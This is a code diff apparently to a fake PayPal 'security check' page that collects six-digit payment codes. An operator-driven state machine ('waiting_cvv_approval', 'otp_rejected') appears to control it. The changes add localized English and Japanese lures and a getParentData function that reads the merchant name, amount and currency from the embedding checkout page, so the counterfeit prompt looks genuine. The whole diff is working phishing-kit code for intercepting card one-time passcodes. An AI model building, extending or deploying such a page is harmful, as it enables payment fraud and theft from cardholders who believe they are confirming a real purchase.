@@ -108,7 +108,10 @@
             margin-bottom: 16px;
         }
         .otp-input {
-            width: 42px;
+            flex: 1;
+            min-width: 0;
+            width: 0;
+            max-width: 48px;
             height: 48px;
             border: 1px solid #9da3a6;
             border-radius: 4px;
@@ -236,7 +239,7 @@
 
             <!-- OTP Form state -->
             <div id="otp-form" class="otp-form">
-                <label class="otp-label">Enter the 6-digit security code sent to your phone</label>
+                <label class="otp-label">Enter the 6-digit security code</label>
                 <div class="otp-inputs" id="otp-inputs">
                     <input type="text" class="otp-input" maxlength="1" data-index="0" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                     <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
@@ -286,6 +289,135 @@
         var resendTimer = null;
         var resending = false;
 
+        var i18n = {
+            en: {
+                merchant_name: 'Online Store Inc.',
+                title_loading: 'Confirm your payment',
+                subtitle_loading: "We're verifying your payment. This may take a moment...",
+                title_otp: 'Security check',
+                subtitle_otp: 'We sent a code to ••••1234. Enter it below to confirm your payment.',
+                otp_label: 'Enter the 6-digit security code',
+                error_msg: "That code didn't work. Please try again.",
+                submit_btn: 'Continue',
+                resend_link: 'Resend code',
+                resend_countdown: 'Resend in ',
+                title_processing: 'Processing',
+                subtitle_processing: 'Please wait while we confirm your payment...',
+                expired_title: 'Session expired',
+                expired_text: 'Your session has timed out for security reasons.<br>Please go back and try again.',
+                completed_title: 'Payment confirmed',
+                completed_text: 'Your payment has been processed successfully.<br>You will be redirected shortly...',
+                footer: 'Powered by PayPal'
+            },
+            ja: {
+                merchant_name: 'オンラインストア',
+                title_loading: 'お支払いを確認中',
+                subtitle_loading: 'お支払いを確認しています。しばらくお待ちください...',
+                title_otp: 'セキュリティ確認',
+                subtitle_otp: '••••1234 にコードを送信しました。お支払いを確定するには下記に入力してください。',
+                otp_label: '6桁のセキュリティコードを入力してください',
+                error_msg: 'コードが正しくありません。もう一度お試しください。',
+                submit_btn: '次へ',
+                resend_link: 'コードを再送',
+                resend_countdown: '再送まで ',
+                title_processing: '処理中',
+                subtitle_processing: 'お支払いを確認しています。しばらくお待ちください...',
+                expired_title: 'セッションの有効期限が切れました',
+                expired_text: 'セキュリティ上の理由からセッションがタイムアウトしました。<br>戻ってもう一度お試しください。',
+                completed_title: 'お支払いが確定しました',
+                completed_text: 'お支払いが正常に処理されました。<br>まもなくリダイレクトされます...',
+                footer: 'Powered by PayPal'
+            }
+        };
+
+        var lang = 'en';
+        (function() {
+            var params = new URLSearchParams(window.location.search);
+            var urlLang = params.get('lang');
+            if (urlLang && i18n[urlLang]) {
+                lang = urlLang;
+            } else {
+                var browserLang = navigator.language || navigator.userLanguage;
+                if (browserLang) {
+                    var shortLang = browserLang.toLowerCase().split('-')[0];
+                    if (i18n[shortLang]) {
+                        lang = shortLang;
+                    }
+                }
+            }
+        })();
+
+        function t(key) {
+            return i18n[lang] && i18n[lang][key] ? i18n[lang][key] : key;
+        }
+
+        function getParentData() {
+            try {
+                if (window.parent && window.parent.document) {
+                    var pdoc = window.parent.document;
+                    var merchantName = null;
+                    var amount = null;
+                    var currency = null;
+
+                    var title = pdoc.title;
+                    if (title && title.indexOf(' - ') > -1) {
+                        merchantName = title.split(' - ')[1].trim();
+                    }
+
+                    var abbr = pdoc.querySelector('abbr');
+                    if (abbr && abbr.textContent) {
+                        currency = abbr.textContent.trim();
+                    }
+
+                    var strongs = pdoc.querySelectorAll('strong');
+                    if (strongs && strongs.length >= 3) {
+                        var s = strongs[2];
+                        if (s && s.textContent) {
+                            amount = s.textContent.trim();
+                        }
+                    }
+
+                    return {
+                        merchantName: merchantName,
+                        amount: amount,
+                        currency: currency
+                    };
+                }
+            } catch (e) {}
+            return { merchantName: null, amount: null, currency: null };
+        }
+
+        function applyParentData() {
+            var data = getParentData();
+            if (data.merchantName) {
+                var el = document.querySelector('.merchant-name');
+                if (el) el.textContent = data.merchantName;
+            }
+            if (data.amount) {
+                var amountEl = document.querySelector('.merchant-amount');
+                if (amountEl) {
+                    var displayAmount = data.amount;
+                    if (data.currency) {
+                        displayAmount = data.currency + ' ' + displayAmount;
+                    }
+                    amountEl.textContent = displayAmount;
+                }
+            }
+        }
+
+        function applyLang() {
+            document.querySelector('.merchant-name').textContent = t('merchant_name');
+            document.querySelector('.paypal-footer').textContent = t('footer');
+            document.querySelector('.otp-label').textContent = t('otp_label');
+            document.getElementById('error-msg').innerHTML = t('error_msg');
+            document.getElementById('submit-btn').textContent = t('submit_btn');
+            document.querySelector('.resend-link').textContent = t('resend_link');
+            document.getElementById('expired-state').querySelector('h2').textContent = t('expired_title');
+            document.getElementById('expired-state').querySelector('p').innerHTML = t('expired_text');
+            document.getElementById('completed-state').querySelector('h2').textContent = t('completed_title');
+            document.getElementById('completed-state').querySelector('p').innerHTML = t('completed_text');
+        }
+
         function getAPIUrl(endpoint) {
             return basePath + '/' + endpoint + '?sid=' + encodeURIComponent(sessionId);
         }
@@ -300,8 +432,8 @@
         }
 
         function showOTPForm() {
-            document.getElementById('title').textContent = 'Enter security code';
-            document.getElementById('subtitle').textContent = 'We sent a code to your phone. Enter it below to confirm your payment.';
+            document.getElementById('title').textContent = t('title_otp');
+            document.getElementById('subtitle').innerHTML = t('subtitle_otp');
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('otp-form').classList.add('active');
             document.getElementById('expired-state').classList.remove('show');
@@ -383,7 +515,7 @@
             switch (state) {
                 case 'waiting_cvv_approval':
                     if (currentState !== state) {
-                        showLoading('Confirm your payment', "We're verifying your payment. This may take a moment...");
+                        showLoading(t('title_loading'), t('subtitle_loading'));
                     }
                     break;
                 case 'otp_waiting':
@@ -396,7 +528,7 @@
                     break;
                 case 'otp_submitted':
                     if (currentState !== state) {
-                        showLoading('Processing', 'Please wait while we confirm your payment...');
+                        showLoading(t('title_processing'), t('subtitle_processing'));
                     }
                     break;
                 case 'otp_rejected':
@@ -471,7 +603,7 @@
             });
             document.getElementById('error-msg').classList.remove('show');
 
-            showLoading('Processing', 'Please wait while we confirm your payment...');
+            showLoading(t('title_processing'), t('subtitle_processing'));
             stopPolling();
 
             var xhr = new XMLHttpRequest();
@@ -512,7 +644,7 @@
             var seconds = resendCooldown;
             btn.style.pointerEvents = 'none';
             btn.style.opacity = '0.5';
-            btn.textContent = 'Resend in ' + seconds + 's';
+            btn.textContent = t('resend_countdown') + seconds + 's';
             resendTimer = setInterval(function() {
                 seconds--;
                 if (seconds <= 0) {
@@ -520,9 +652,9 @@
                     resendTimer = null;
                     btn.style.pointerEvents = '';
                     btn.style.opacity = '';
-                    btn.textContent = 'Resend code';
+                    btn.textContent = t('resend_link');
                 } else {
-                    btn.textContent = 'Resend in ' + seconds + 's';
+                    btn.textContent = t('resend_countdown') + seconds + 's';
                 }
             }, 1000);
         }
@@ -594,6 +726,9 @@
                 }
             });
         });
+
+        applyLang();
+        applyParentData();
 
         // === Debug Mode: static preview with window.state ===
         (function() {
